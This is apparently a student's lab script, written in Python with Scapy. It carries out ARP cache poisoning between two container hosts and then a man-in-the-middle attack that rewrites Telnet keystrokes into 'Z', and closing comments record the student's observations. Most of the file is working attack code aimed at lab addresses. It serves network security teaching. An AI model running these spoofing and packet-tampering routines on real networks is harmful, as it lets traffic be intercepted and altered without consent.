AIP_addr = '10.9.0.5'
BIP_addr = '10.9.0.6'
MMAC_addr = '02:42:0a:09:00:69'
AMAC_addr = '02:42:0a:09:00:05'
BMAC_addr = '02:42:0a:09:00:06'

from scapy.all import *
import os
import re

"""
    - Host M conducts an ARP cache poisoning attack on both A and B.
    - Such that in A's ARP cache, B's IP address maps to M's MAC address
    - And in B's ARP cache, A's IP address also maps to M's MAC address.
"""

def poison_arp(target_MAC_addr, MMAC_addr, IPsrc, IPdst):
    # Turn on IP forwarding
    print('Turn on IP Forwarding')
    os.system('sysctl net.ipv4.ip_forward=1')

    # Create ARP Request
    e = Ether(src=MMAC_addr, dst = target_MAC_addr, type= 0x0806)
    a = ARP(op= 2, psrc= IPsrc, pdst= IPdst, hwdst = target_MAC_addr)   #, hwsrc=MMAC_addr)

    pkt = e/a
    pkt.show()

    sendp(pkt)

    # Turn off IP forwarding
    print('Turn off IP Forwarding')
    os.system('sysctl net.ipv4.ip_forward=0')

"""
    - Assume that A is the Telnet client and B is the Telnet server.
    - After A has connected to the Telnet server on B, for every key stroke typed in A's Telnet window,
        a TCP packet is generated and sent to B.
    - We would like to intercept the TCP packet, and replace each typed character with a fixed character
        (say Z).
    - This way, it does not matter what the user types on A, Telnet will always display Z.
"""

def MITM_Attack(pkt):
    # Due to turning off IP forwarding so we just need to capture packet from host A (client).
    if(pkt[Ether].src!= MMAC_addr):
        if(pkt[IP].src== AIP_addr and pkt[IP].dst== BIP_addr):
            print('Packet sent from A to B!')
            # Create a new packet based on the captured one.
            # 1) We need to delete the checksum in the IP & TCP headers,
                # because our modification will make them invalid.
                # Scapy will recalculate them if these fields are missing.
            # 2) We also delete the original TCP payload.
            new_pkt = IP(bytes(pkt[IP]))
            del(new_pkt.chksum)
            del(new_pkt[TCP].payload)
            del(new_pkt[TCP].chksum)
            # Construct new payload that A sends to B 'Z' message when B types on A's Telnet.
            if(pkt[TCP].payload):
                # For Telnet packet that contains TCP when B types on A's Telnet.
                data = pkt[TCP].payload.load
                print('Original data: {}'.format(data))
                
                # Send 'Z' character when key stroke typed is alphabet or number only
                reply_data = re.sub('[a-zA-Z0-9]','Z',data.decode())
                send(new_pkt/reply_data)
            else:
                # For TCP packet
                send(new_pkt)
        elif(pkt[IP].src == BIP_addr and pkt[IP].dst== AIP_addr):
            # For packets from B to A (Telnet response), we do not make any change,
            # so the spoofed packet is exactly the same as the original one.
            print('Packet sent from B to A!')
            new_pkt = IP(bytes(pkt[IP]))
            del(new_pkt.chksum)
            del(new_pkt[TCP].chksum)
            send(new_pkt)

fil = 'tcp'
interface= 'eth0'
id = int(input('Choose type attack: \n[1]: ARP Poisoning Cache.\n[2]: MITM_Attack on Telnet.\nEnter: '))
if(id == 1):
    # M send ARP packet to host A and B.
    poison_arp(AMAC_addr, MMAC_addr, BIP_addr, AIP_addr)
    poison_arp(BMAC_addr, MMAC_addr, AIP_addr, BIP_addr)

elif(id == 2):
    pkt = sniff(iface=interface, filter=fil, prn=MITM_Attack)
else:
    print('Invalid value!')
    sys.exit()

# Answer my observation:
'''
    - After sending poison ARP Reply to host A and B from host M and then ping from host A to B:
        + IP Forwarding in host M turn off:
            ** Host A will not receive ICMP Reply from host M.
            ** Host A will send ARP Request packet to host M.
            ** After not receiving ARP Reply from host M, host A will send ARP request to Broadcast Address.
                Then, host B will send ARP Reply to host A.

        + IP Forwarding in host M turn on:
            ** Host M will receive ICMP Request from host A and move it to host B.
            ** Host B will send ICMP Rely to host M. After that, host M will send ICMP Redirect to host B with 
                its IP address.
            ** Host M now can impersonate host B by using host B's IP address, and send ICMP Reply back to
                host A.
    
    - After launching MITM-attack in Telnet server.
        + When IP forwarding turns off in all Telnet connection, the ARP table will reset the MAC address into
            correct hosts.
        + When IP forwarding turns on in all Telnet connection, the ARP table saves MAC address of host M only,
            however, host M can not spoof packets as it impersonates each host to send the copy packets to
            the another.
        + When turning on IP forwarding after host A connects to host B's Telnet server, and turning off
            IP forwarding before host A types input in B's Telnet Server. This time, host M will be
            the middle node between A and B. It receives message from host A and modify the keystroke character
            into 'Z' and sends to B. When receiving packet from Server B, it does not change anything and send
            to A.
'''